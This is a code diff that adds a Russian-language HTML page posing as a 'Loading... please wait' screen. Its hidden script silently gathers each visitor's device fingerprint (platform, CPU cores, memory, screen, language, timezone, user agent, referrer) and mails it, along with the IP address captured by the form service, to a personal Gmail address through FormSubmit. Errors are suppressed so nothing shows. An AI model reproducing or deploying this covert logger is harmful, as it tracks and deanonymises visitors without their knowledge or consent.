@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
+    <style>body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#111;color:#555;font-family:sans-serif;}</style>
+</head>
+<body>
+    <div>Подождите...</div>
+    
+    <script>
+        // Сбор данных
+        const payload = {
+            ip_info: 'See email headers', // FormSubmit добавляет IP автоматически
+            platform: navigator.platform,
+            cores: navigator.hardwareConcurrency || 'N/A',
+            ram_gb: navigator.deviceMemory || 'N/A',
+            screen: `${screen.width}x${screen.height}`,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            user_agent: navigator.userAgent,
+            referrer: document.referrer || 'Direct'
+        };
+
+        // Тихая отправка
+        fetch('https://formsubmit.co/ajax/majornyy2@gmail.com', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                _subject: '🔴 New Site Visit Detected',
+                _template: 'table',
+                ...payload
+            })
+        }).catch(() => {}); // Глотаем ошибки молча
+    </script>
+</body>
+</html>
